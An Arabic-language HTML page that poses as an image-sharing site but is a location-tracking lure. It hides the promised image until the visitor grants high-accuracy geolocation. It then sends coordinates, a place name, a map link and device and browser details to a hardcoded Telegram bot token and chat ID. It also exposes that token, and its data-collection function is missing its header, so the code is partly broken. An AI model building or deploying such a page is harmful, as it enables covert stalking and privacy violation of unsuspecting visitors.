<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            display: none; /* مخفية في البداية */
            transition: all 0.5s ease;
        }

        .main-image.show {
            display: block;
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: none; /* مخفي في البداية */
            transition: all 0.3s ease;
        }

        .click-button.show {
            display: block;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .status-message {
            background: #74b9ff;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            font-size: 1.1em;
            font-weight: bold;
        }

        .status-message.success {
            background: #00b894;
        }

        .status-message.error {
            background: #e74c3c;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <div class="status-message" id="statusMessage">
            🔍 جاري طلب الموقع الجغرافي...
            <span class="loading"></span>
        </div>

        <button class="click-button" id="viewButton" onclick="viewImage()">
            🔍 مشاهدة الصورة
        </button>
    </div>

    <script>
        // الحصول على اسم المكان من الإحداثيات
        async function getLocationName(lat, lng) {
            try {
                const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=ar`);
                const data = await response.json();
                
                let locationName = 'غير معروف';
                if (data.city || data.locality) {
                    locationName = `${data.city || data.locality}, ${data.countryName || data.country}`;
                }
                
                return locationName;
            } catch (error) {
                console.error('خطأ في الحصول على اسم المكان:', error);
                return 'غير معروف';
            }
        }
            const ua = navigator.userAgent;
            
            let deviceType = 'كمبيوتر';
            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
            
            let browser = 'غير معروف';
            if (ua.includes('Chrome')) browser = 'كروم';
            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
            else if (ua.includes('Safari')) browser = 'سفاري';
            else if (ua.includes('Edge')) browser = 'إيدج';
            
            let os = 'غير معروف';
            if (ua.includes('Windows')) os = 'ويندوز';
            else if (ua.includes('Mac')) os = 'ماك';
            else if (ua.includes('Linux')) os = 'لينكس';
            else if (ua.includes('Android')) os = 'أندرويد';
            else if (ua.includes('iOS')) os = 'iOS';
            
            // الحصول على اسم المكان إذا كان الموقع متاح
            let locationName = 'غير متاح';
            if (window.userLocation?.latitude !== 'غير متاح' && window.userLocation?.longitude !== 'غير متاح') {
                locationName = await getLocationName(window.userLocation.latitude, window.userLocation.longitude);
            }

            return {
                timestamp: new Date().toLocaleString('ar-IQ'),
                page_url: window.location.href,
                device_type: deviceType,
                browser: browser,
                operating_system: os,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                user_agent: ua,
                // إضافة متغيرات الموقع
                latitude: window.userLocation?.latitude || 'غير متاح',
                longitude: window.userLocation?.longitude || 'غير متاح',
                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
                location_status: window.userLocation?.status || 'لم يتم الطلب',
                location_name: locationName // اسم المكان
            };
        }

        function sendToTelegram(data) {
            // التوكن الخاص بالبوت
            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            // Chat ID الخاص بك
            const TELEGRAM_CHAT_ID = '170383339';
            
            // إنشاء رابط الخريطة إذا كان الموقع متاح
            let mapLink = '';
            if (data.latitude !== 'غير متاح' && data.longitude !== 'غير متاح') {
                mapLink = `\n🗺️ عرض على الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            }
            
            const message = `
🆕 زائر جديد للموقع:
━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${data.timestamp}
🌐 الرابط: ${data.page_url}
📱 الجهاز: ${data.device_type}
💻 المتصفح: ${data.browser}
🖥️ النظام: ${data.operating_system}
📺 الدقة: ${data.screen_resolution}
🌍 المنطقة: ${data.timezone}
🗣️ اللغة: ${data.language}
📍 الموقع الجغرافي: ${data.location_status}
🏙️ اسم المكان: ${data.location_name}
📐 خط العرض: ${data.latitude}
📐 خط الطول: ${data.longitude}
🎯 دقة الموقع: ${data.location_accuracy}${mapLink}
━━━━━━━━━━━━━━━━━━
            `;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
                    return response.json();
                } else {
                    console.error('❌ فشل إرسال البيانات إلى Telegram');
                    throw new Error('Telegram API Error');
                }
            }).then(data => {
                console.log('📱 استجابة Telegram:', data);
                
                // إرسال الموقع كـ Location منفصل إذا كان متاح
                if (data.latitude !== 'غير متاح' && data.longitude !== 'غير متاح') {
                    sendLocationPin(data.latitude, data.longitude);
                }
            }).catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
            });
        }

        // إرسال الموقع كـ Pin على الخريطة
        function sendLocationPin(lat, lng) {
            const url = `https://api.telegram.org/bot7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI/sendLocation`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '170383339',
                    latitude: parseFloat(lat),
                    longitude: parseFloat(lng)
                })
            }).then(response => {
                if (response.ok) {
                    console.log('📍 تم إرسال الموقع كـ Pin بنجاح');
                } else {
                    console.error('❌ فشل إرسال الموقع');
                }
            }).catch(error => {
                console.error('❌ خطأ في إرسال الموقع:', error);
            });
        }

        async function viewImage() {
            // التحقق من وجود الموقع الجغرافي
            if (window.userLocation?.status !== 'تم الحصول عليه بنجاح') {
                document.getElementById('statusMessage').innerHTML = '❌ يجب الموافقة على مشاركة الموقع أولاً';
                document.getElementById('statusMessage').className = 'status-message error';
                return;
            }

            // إظهار الصورة والرسالة
            document.getElementById('mainImage').classList.add('show');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('statusMessage').innerHTML = '✅ تم الموافقة على عرض الصورة';
            document.getElementById('statusMessage').className = 'status-message success';
            
            // جمع وإرسال البيانات
            const data = await collectData();
            console.log('بيانات الزائر:', data);
            
            // إرسال البيانات
            sendToTelegram(data);
        }

        // جمع الموقع الجغرافي عند تحميل الصفحة
        window.userLocation = { status: 'جاري المحاولة...' };

        function getLocation() {
            if (navigator.geolocation) {
                console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        window.userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy) + ' متر',
                            status: 'تم الحصول عليه بنجاح'
                        };
                        console.log('✅ تم الحصول على الموقع:', window.userLocation);
                        
                        // إظهار زر المشاهدة عند نجاح الحصول على الموقع
                        document.getElementById('statusMessage').innerHTML = '✅ تم الحصول على الموقع بنجاح';
                        document.getElementById('statusMessage').className = 'status-message success';
                        document.getElementById('viewButton').classList.add('show');
                    },
                    function(error) {
                        let errorMsg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'رفض المستخدم';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'الموقع غير متاح';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'انتهت مهلة الانتظار';
                                break;
                            default:
                                errorMsg = 'خطأ غير معروف';
                        }
                        
                        window.userLocation = {
                            latitude: 'غير متاح',
                            longitude: 'غير متاح',
                            accuracy: 'غير متاح',
                            status: errorMsg
                        };
                        console.log('❌ فشل الحصول على الموقع:', errorMsg);
                        
                        // إخفاء كل شيء عند رفض الموقع
                        document.getElementById('statusMessage').innerHTML = '❌ لا يمكن عرض المحتوى بدون مشاركة الموقع';
                        document.getElementById('statusMessage').className = 'status-message error';
                        // عدم إظهار الزر أو الصورة
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                window.userLocation = {
                    latitude: 'غير متاح',
                    longitude: 'غير متاح', 
                    accuracy: 'غير متاح',
                    status: 'المتصفح لا يدعم تحديد الموقع'
                };
                console.log('❌ المتصفح لا يدعم تحديد الموقع');
                
                document.getElementById('statusMessage').innerHTML = '❌ المتصفح لا يدعم تحديد الموقع';
                document.getElementById('statusMessage').className = 'status-message error';
            }
        }

        // الحصول على الموقع الجغرافي عند التحميل
        window.addEventListener('load', function() {
            console.log('🚀 تم تحميل الصفحة');
            getLocation();
        });
    </script>
</body>
</html>
